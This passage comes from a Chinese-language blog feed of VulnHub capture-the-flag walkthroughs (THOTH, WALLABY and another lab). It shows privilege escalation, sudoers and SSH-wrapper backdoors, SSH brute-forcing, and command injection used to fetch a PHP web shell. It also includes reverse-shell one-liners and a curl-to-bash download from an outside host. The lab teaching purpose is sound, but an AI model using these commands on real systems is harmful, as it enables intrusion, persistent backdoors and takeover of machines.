data-src=\"/N1h1l157/VULNHUB/image-122.png\" alt></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">标准shell</span></span><br><span class=\"line\">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27; then press Ctrl+Z</span><br><span class=\"line\">stty raw -echo;fg then press ENTER twice</span><br><span class=\"line\">export TERM=xterm</span><br><span class=\"line\">cd / &amp;&amp; id</span><br></pre></td></tr></table></figure>\n<h3 id=\"suid-提权\"><a class=\"markdownIt-Anchor\" href=\"#suid-提权\">#</a> SUID 提权</h3>\n<p>尝试 suid 提权</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">发现系统上运行所有suid可执行文件</span></span><br><span class=\"line\">find / -perm -u=s -type f 2 &gt;/dev/null</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">-perm表示搜索后面的权限 - u=s表示查找 root 用户拥有的文件</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">-<span class=\"built_in\">type</span>表示我们正在寻找的文件类型 f 表示普通文件，而不是目录或特殊文件</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">2 表示到进程的第二个文件描述符，即 stderr（标准错误）&gt;表示重定向</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">/dev/null是一个特殊的文件系统对象，它会丢弃写入其中的所有内容。</span></span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-123.png\" width=\"480\" alt=\"Image\">\n未找到 nmap vim find bash more less nano cp 含有s权限\n<h3 id=\"sudogdb-提权\"><a class=\"markdownIt-Anchor\" href=\"#sudogdb-提权\">#</a> sudo (gdb) 提权</h3>\n<p>提权教程：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8vZ3Rmb2JpbnMvZ2RiLw==\">https://gtfobins.github.io/gtfobins/gdb/</span></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">由于gdb只是针对用户offensivehack来言是无密码的</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">所以这里需要通过-u来指定用户名，使用该用户来通过gdb反弹shell</span></span><br><span class=\"line\">sudo -u offensivehack gdb -nx -ex &#x27;!sh&#x27; -ex quit</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">-l, list user\\<span class=\"string\">&#x27;s privileges or check a specific command; use twice for longer format</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"string\">-u, run command (or edit file) as specified user name or ID</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"string\">通过python3 来将当前的终端转化为一个标准的shell：</span></span></span><br><span class=\"line\">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-124.png\" alt></p>\n<h3 id=\"iddocker-提权\"><a class=\"markdownIt-Anchor\" href=\"#iddocker-提权\">#</a> id (docker) 提权</h3>\n<p>注意到输入 id 的时候有补充组 docker，可采用 docker 提权<br>\n Docker 提权说明：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8vZ3Rmb2JpbnMvZG9ja2VyLw==\">https://gtfobins.github.io/gtfobins/docker/</span></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">docker 提权</span></span><br><span class=\"line\">docker run -v /:/mnt --rm -it alpine chroot /mnt sh</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">标准shell：</span></span><br><span class=\"line\">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-125.png\" width=\"580\" alt=\"Image\">\n<h3 id=\"篡改-sudoers-维权\"><a class=\"markdownIt-Anchor\" href=\"#篡改-sudoers-维权\">#</a> 篡改 sudoers 维权</h3>\n<p>由当前 root 权限的机器继续执行操作</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">设置密码为kali</span></span><br><span class=\"line\">useradd kali &amp;&amp; passwd kali</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">添加sudoers文件写权限:</span> </span><br><span class=\"line\">chmod u+w /etc/sudoers</span><br><span class=\"line\">vim /etc/sudoers</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">root ALL=(ALL) ALL 这一行，在其下面追加：</span></span><br><span class=\"line\">kali ALL=(ALL) ALL</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">撤销sudoers文件权限:</span> </span><br><span class=\"line\">chmod u-w /etc/sudoers</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-126.png\" width=\"450\" alt=\"Image\">\n<p>攻击机：ssh <span class=\"exturl\" data-url=\"bWFpbHRvOmthbGlAMTkyLjE2OC4zMS4yMzA=\">kali@192.168.31.230</span> &amp;&amp; sudo cat /root/flag.txt</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-127.png\" width=\"470\" alt=\"Image\">\n<p>-&gt; 可登陆 kali，用 sudo 进行 root 权限的操作</p>\n",
            "tags": [
                "VULNHUB 1-10"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2021/11/01/VULNHUB/112%20THOTH/",
            "url": "http://www.n1h1l157.live/2021/11/01/VULNHUB/112%20THOTH/",
            "title": "VULNHUB 12 THOTH",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvdGhvdGgtdGVjaC0xLDczNC8=\">https://www.vulnhub.com/entry/thoth-tech-1,734/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5OTkxODM3L2FydGljbGUvZGV0YWlscy8xMTk5NDQ5Mzc=\">https://blog.csdn.net/qq_39991837/article/details/119944937</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 THOTH：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<p>1）arp 确定靶机地址<br>\n <code>sudo arp-scan -l</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-253.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 目标机器的 ip 地址： 192.168.31.229</p>\n<ol start=\"2\">\n<li>确认靶机 ip 开放的端口信息<br>\n <code>sudo nmap -A -p- 192.168.31.229 -oN /tmp/thoth.txt</code></li>\n</ol>\n<img data-src=\"/N1h1l157/VULNHUB/image-254.png\" width=\"450\" alt=\"Image\">\n<p>-&gt; 靶机开放端口 21, 22, 80</p>\n<h3 id=\"ftp-匿名登陆\"><a class=\"markdownIt-Anchor\" href=\"#ftp-匿名登陆\">#</a> FTP 匿名登陆</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">利用用户ftp和空密码登陆到ftp查看有没有敏感文件</span></span><br><span class=\"line\">ftp 192.168.31.229</span><br><span class=\"line\">dir &amp;&amp; get note.txt</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-255.png\" alt></p>\n<p>-&gt; 得到提示是 pwnlab 是该服务器的某一个用户，并且密码比较简单</p>\n<h3 id=\"目录扫描\"><a class=\"markdownIt-Anchor\" href=\"#目录扫描\">#</a> 目录扫描</h3>\n<p>80 网站信息收集，是个默认的 apache 界面</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-256.png\" alt></p>\n<p><code>dirsearch -u http://192.168.31.229</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-257.png\" width=\"520\" alt=\"Image\">\n<p><code>gobuster dir -u http://192.168.31.229/ -x php,txt,html,zip,rar -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-253.png\" width=\"570\" alt=\"Image\">\n<p>-&gt; gobuster 扫描后并没有什么发现</p>\n<h3 id=\"hydra-爆破-ssh\"><a class=\"markdownIt-Anchor\" href=\"#hydra-爆破-ssh\">#</a> hydra 爆破 SSH</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">hydra 爆破可疑用户 pwdlab 的密码登陆ssh</span></span><br><span class=\"line\">hydra -l pwnlab -P /usr/share/wordlists/rockyou.txt ssh://192.168.31.229 -f -t 4 -vV -o hydra.ssh</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-259.png\" alt></p>\n<p>-&gt; 账户：pwnlab 密码：babygirl1</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">登陆服务器</span></span><br><span class=\"line\">ssh pwnlab@192.168.31.229</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">收集服务器信息：</span></span><br><span class=\"line\">cat /etc/issue &amp;&amp; uname -a &amp;&amp; sudo -l</span><br></pre></td></tr></table></figure>\n<h3 id=\"sudofind提权\"><a class=\"markdownIt-Anchor\" href=\"#sudofind提权\">#</a> sudo (find) 提权</h3>\n<p>发现可以直接通过无密码调用 root 权限的 find<br>\n 寻找提权命令：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8vZ3Rmb2JpbnMvZmluZC8=\">https://gtfobins.github.io/gtfobins/find/</span><br>\n <code>sudo find. -exec /bin/sh \\; -quit</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-260.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 直接提升成了 root 账户</p>\n<h3 id=\"ssh-wrapper维权\"><a class=\"markdownIt-Anchor\" href=\"#ssh-wrapper维权\">#</a> SSH wrapper 维权</h3>\n<p>参考地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ieXBhc3MwMDcuZ2l0aHViLmlvL0VtZXJnZW5jeS1SZXNwb25zZS1Ob3Rlcy9wcml2aWxlZ2Uv\">https://bypass007.github.io/Emergency-Response-Notes/privilege/</span><br>\n 从 sshd fork 出一个子进程，输入输出重定向到套接字，并对连过来的客户端端口进行了判断。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">靶机上依次执行一下命令：</span></span><br><span class=\"line\">cd /usr/sbin/</span><br><span class=\"line\">mv sshd ../bin/</span><br><span class=\"line\">echo &#x27;#!/usr/bin/perl&#x27; &gt;sshd</span><br><span class=\"line\">echo &#x27;exec &quot;/bin/sh&quot; if(getpeername(STDIN) =~ /^..4A/);&#x27; &gt;&gt;sshd</span><br><span class=\"line\">echo &#x27;exec&#123;&quot;/usr/bin/sshd&quot;&#125; &quot;/usr/sbin/sshd&quot;,@ARGV,&#x27; &gt;&gt;sshd</span><br><span class=\"line\">chmod u+x sshd</span><br><span class=\"line\">/etc/init.d/sshd restart</span><br><span class=\"line\">Service ssh restart</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-261.png\" alt></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">攻击机执行以下命令</span></span><br><span class=\"line\">socat STDIO TCP4:192.168.31.229:22,sourceport=13377</span><br><span class=\"line\">python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class=\"line\">stty raw -echo;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-262.png\" alt></p>\n<p>-&gt; ssh wrapper 权限维持成功，可免密登陆 root 账户</p>\n",
            "tags": [
                "VULNHUB 11-20"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2021/11/01/VULNHUB/109%20WALLABY/",
            "url": "http://www.n1h1l157.live/2021/11/01/VULNHUB/109%20WALLABY/",
            "title": "VULNHUB 9 WALLABY",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvd2FsbGFieXMtbmlnaHRtYXJlLXYxMDIsMTc2Lw==\">https://www.vulnhub.com/entry/wallabys-nightmare-v102,176/</span><br>\n 教程链接地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1L2FydGljbGUvZGV0YWlscy8xMDQwOTUwMjk=\">https://blog.csdn.net/qq_34801745/article/details/104095029</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 WALLABY：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<ol>\n<li>\n<p>通过 netdiscover 扫描当前网卡里边有哪些机器<br>\n <code>sudo netdiscover -i eth0 -r 192.168.31.0/24</code></p>\n</li>\n<li>\n<p>将所有已知的 ip 暂时存档，对这类 ip 地址不做端口扫描</p>\n</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">shell</span></span><br><span class=\"line\">cat &gt; myip.txt &lt;&lt; EOF</span><br><span class=\"line\">192.168.31.1 192.168.31.25 192.168.31.58 192.168.31.86 192.168.31.33</span><br><span class=\"line\">192.168.31.120 192.168.31.135 192.168.31.145 192.168.31.162 192.168.31.44</span><br><span class=\"line\">EOF</span><br></pre></td></tr></table></figure>\n<ol start=\"3\">\n<li>去除一些已知 ip 的机器，对剩余 IP 进行端口扫描，判断目标 IP<br>\n <code>sudo nmap -PA 192.168.31.107 --excludefile myip.txt</code></li>\n</ol>\n<img data-src=\"/N1h1l157/VULNHUB/image-150.png\" width=\"550\" alt=\"Image\">\n<p>-&gt; 目标机器的 ip 地址： 192.168.31.5</p>\n<ol start=\"4\">\n<li>确认靶机 ip 开放的端口信息</li>\n</ol>\n<p><code>sudo nmap -A -p- 192.168.31.15 -oN /tmp/wallaby.txt</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-151.png\" width=\"460\" alt=\"Image\">\n<p>-&gt; 靶机开放端口 22, 80, 6667</p>\n<h3 id=\"lfi-漏洞测试\"><a class=\"markdownIt-Anchor\" href=\"#lfi-漏洞测试\">#</a> LFI 漏洞测试</h3>\n<ol>\n<li>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNS8=\">http://192.168.31.5/</span> 进行信息收集</li>\n</ol>\n<img data-src=\"/N1h1l157/VULNHUB/image-152.png\" width=\"390\" alt=\"Image\">\n<p>输入名字并登陆此网站</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-153.png\" width=\"390\" alt=\"Image\">\n<p>观察 url 地址，发现存在 lfi 本地文件包含漏洞</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-154.png\" alt></p>\n<p>直接构造 http://192.168.31.5/?page=/etc/passwd</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-155.png\" alt></p>\n<p>访问 http://192.168.31.5/?page=/etc/sudoers 发现对方管理员检测到了 lfi 攻击</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-156.png\" width=\"520\" alt=\"Image\">\n<p>重新访问 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNS8=\">http://192.168.31.5/</span> 发现网站已经挂掉了</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-157.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 80 端口被关闭，网站已被注销，重新尝试端口扫描</p>\n<h3 id=\"60080-网站信息收集\"><a class=\"markdownIt-Anchor\" href=\"#60080-网站信息收集\">#</a> 60080 网站信息收集</h3>\n<p>重新扫描端口，发现 80 被关闭，新开了一个 60080 端口网站<br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNTo2MDA4MC8=\"> http://192.168.31.5:60080/</span> 渗透测试</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-158.png\" width=\"440\" alt=\"Image\">\n<p>发现此端口确实存在网站，目标转为对此网站的分析</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-159.png\" alt></p>\n<p>目录爆破，收集更多的目录信息</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dirsearch -u http://192.168.31.5:60080/</span><br><span class=\"line\">gobuster dir -u http://192.168.31.5:60080/ - w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-160.png\" width=\"580\" alt=\"Image\">\n<p>并没有发现任何有价值的信息</p>\n<h3 id=\"dirb-目录扫描\"><a class=\"markdownIt-Anchor\" href=\"#dirb-目录扫描\">#</a> dirb 目录扫描</h3>\n<p>仔细回想之前的操作，在 80 端口对网站渗透时，发现了 lfi 漏洞<br>\n是在 http://192.168.31.5/?page=home 上的，尝试访问 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNTo2MDA4MC8/cGFnZT1ob21l\">http://192.168.31.5:60080/?page=home</span> 仍存在 lfi 漏洞</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-161.png\" alt></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNTo2MDA4MC8/cGFnZT0vZXRjL3N1ZG9lcnM=\">http://192.168.31.5:60080/?page=/etc/sudoers</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-162.png\" width=\"500\" alt=\"Image\">\n<p>使用 dirb 对 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNTo2MDA4MC8/cGFnZT0=\">http://192.168.31.5:60080/?page=</span> 目录进行扫描</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">dirb是一个基于字典的web目录扫描工具，查找现有的（和/或隐藏的）Web对象，通过对Web服务器发起基于字典的攻击并分析响应的数据。</span></span><br><span class=\"line\">dirb http://192.168.31.5:60080/index.php?page=</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-163.png\" width=\"570\" alt=\"Image\">\n<p>-&gt; 敏感网址：<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNTo2MDA4MC9pbmRleC5waHA/cGFnZT1tYWlsZXI=\">http://192.168.31.5:60080/index.php?page=mailer</span></p>\n<p>将这些文件访问了一遍之后，发现此网站是唯一可能存在漏洞的目标</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-164.png\" width=\"520\" alt=\"Image\">\n<p>检查源代码，发现这里有一个 rce 漏洞</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-165.png\" alt></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNTo2MDA4MC9pbmRleC5waHA/cGFnZT1tYWlsZXImYW1wO21haWw9bWFpbA==\">http://192.168.31.5:60080/index.php?page=mailer&amp;mail=mail</span><br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNTo2MDA4MC9pbmRleC5waHA/cGFnZT1tYWlsZXImYW1wO21haWw9bHM=\">http://192.168.31.5:60080/index.php?page=mailer&amp;mail=ls</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-166.png\" width=\"520\" alt=\"Image\">\n<h3 id=\"phpcurlbashnc-反弹\"><a class=\"markdownIt-Anchor\" href=\"#phpcurlbashnc-反弹\">#</a> php/curl/bash/nc 反弹</h3>\n<p>判断目标服务器上是否存在相关的命令<br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNTo2MDA4MC9pbmRleC5waHA/cGFnZT1tYWlsZXImYW1wO21haWw9d2hpY2glMjBjdXJs\"> http://192.168.31.5:60080/index.php?page=mailer&amp;mail=which%20curl</span><br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNTo2MDA4MC9pbmRleC5waHA/cGFnZT1tYWlsZXImYW1wO21haWw9d2hpY2glMjBweXRob24=\">http://192.168.31.5:60080/index.php?page=mailer&amp;mail=which%20python</span><br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNTo2MDA4MC9pbmRleC5waHA/cGFnZT1tYWlsZXImYW1wO21haWw9d2hpY2glMjBwaHA=\">http://192.168.31.5:60080/index.php?page=mailer&amp;mail=which%20php</span><br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNTo2MDA4MC9pbmRleC5waHA/cGFnZT1tYWlsZXImYW1wO21haWw9d2hpY2glMjBuYw==\">http://192.168.31.5:60080/index.php?page=mailer&amp;mail=which%20nc</span></p>\n<p>也可以直接一句话判断所有的信息：<br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNTo2MDA4MC9pbmRleC5waHA/cGFnZT1tYWlsZXImYW1wO21haWw9d2hpY2glMjBjdXJsO3doaWNoJTIwcGhwO3doaWNoJTIwcHl0aG9uO3doaWNoJTIwYmFzaDs=\">http://192.168.31.5:60080/index.php?page=mailer&amp;mail=which curl;which php;which python;which bash;</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-167.png\" width=\"560\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">根据收集到的服务器上的信息进行反弹shell</span></span><br><span class=\"line\">php -r &#x27;$sock=fsockopen(&quot;192.168.31.135&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br><span class=\"line\">curl http://www.chentuo.asia/shell.sh | bash (success)</span><br><span class=\"line\">bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.31.135/4444 0&gt;&amp;1&#x27;</span><br><span class=\"line\">bash -i &gt;&amp; /dev/tcp/192.168.31.135/4445 0&gt;&amp;1</span><br><span class=\"line\">nc 192.168.31.135 4444 -e /bin/bash</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-168.png\" alt></p>\n<h3 id=\"kali-php木马反弹\"><a class=\"markdownIt-Anchor\" href=\"#kali-php木马反弹\">#</a> kali php 木马反弹</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cp /usr/share/webshells/php/php-reverse-shell.php shell.php</span><br><span class=\"line\">vim shell.php 将默认端口改为kali的ip和端口号</span><br><span class=\"line\">python 3 -m http.server 80</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">构造如下url执行php</span></span><br><span class=\"line\">http://192.168.31.5:60080/index.php?page=mailer&amp;mail=wget%20http://192.168.31.135/shell.php;%20chmod%20777%20shell.php;%20ls%20-al</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-169.png\" alt></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">也可以将shell.php发送到有公网ip的网站上让目标机器去访问远程url地址上的payload并反弹shell</span></span><br><span class=\"line\">scp -P 2121 shell.php root@1.117.52.219:/data/wwwroot/www.chentuo.asia/shell.php</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">构造如下url执行php</span></span><br><span class=\"line\">http://192.168.31.5:60080/index.php?page=mailer&amp;mail=wget%20http://www.chentuo.asia/shell.php;%20chmod%20777%20shell.php;%20ls%20-al</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>上述的方法下载下来的 shell.php 是空文件，默认不允许下载此类文件</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">在服务器上操作 <span class=\"built_in\">cp</span> shell.php shell.txt,下载后重命名即可,构造如下url执行php</span></span><br><span class=\"line\">http://192.168.31.5:60080/index.php?page=mailer&amp;mail=wget%20http://www.chentuo.asia/shell.txt;mv%20shell.txt%20shell.php%20chmod%20777%20shell.php;%20ls%20-al</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">监听本地的 4444 端口，并且同时运行此shell.php文件</span></span><br><span class=\"line\">[http://192.168.31.5:60080/shell.php](http://192.168.31.5:60080/shell.php)</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-170.png\" alt></p>\n<h3 id=\"python反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#python反弹shell\">#</a> python 反弹 shell</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span 